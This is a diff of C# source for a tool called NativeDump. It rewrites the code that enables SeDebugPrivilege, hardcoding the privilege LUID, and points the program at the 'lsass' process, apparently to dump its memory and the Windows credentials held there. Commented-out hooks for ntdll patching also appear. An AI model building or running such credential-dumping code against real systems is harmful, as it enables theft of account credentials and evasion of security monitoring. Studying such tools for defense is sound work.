@@ -4,6 +4,7 @@ using System.Diagnostics;
 using System.Runtime.InteropServices;
 using static NativeDump.Win32;
 using static NativeDump.CreateFile;
+//using static NativeDump.FromDisk;
 
 namespace NativeDump
 {
@@ -18,27 +19,22 @@ namespace NativeDump
                 int result = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                 if (result != 0)
                 {
-                    throw new InvalidOperationException("Error al abrir el token de acceso.");
+                    Console.WriteLine("[-] Error calling NtOpenProcessToken. Result: " + result);
+                    Environment.Exit(-1);
                 }
 
-                LUID luid = new LUID();
-                if (!LookupPrivilegeValue(null, SE_DEBUG_NAME, ref luid))
-                {
-                    throw new InvalidOperationException("Error al obtener el LUID del privilegio SeDebugPrivilege.");
-                }
-
-                TOKEN_PRIVILEGES privileges = new TOKEN_PRIVILEGES
+                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                 {
                     PrivilegeCount = 1,
-                    Privileges = new LUID_AND_ATTRIBUTES[1]
+                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
+                    Attributes = 0x00000002
                 };
 
-                privileges.Privileges[0].Luid = luid;
-                privileges.Privileges[0].Attributes = 0x00000002;
-                
-                if (NtAdjustPrivilegesToken(tokenHandle, false, ref privileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero) != 0)
+                result = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
+                if (result != 0)
                 {
-                    throw new InvalidOperationException("Error al habilitar el privilegio SeDebugPrivilege.");
+                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. Result: " + result + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
+                    Environment.Exit(-1);
                 }
             }
             finally
@@ -147,6 +143,8 @@ namespace NativeDump
 
         static void Main(string[] args)
         {
+            //PatchNtdll();
+
             // Get process name
             string procname = "lsass";
             
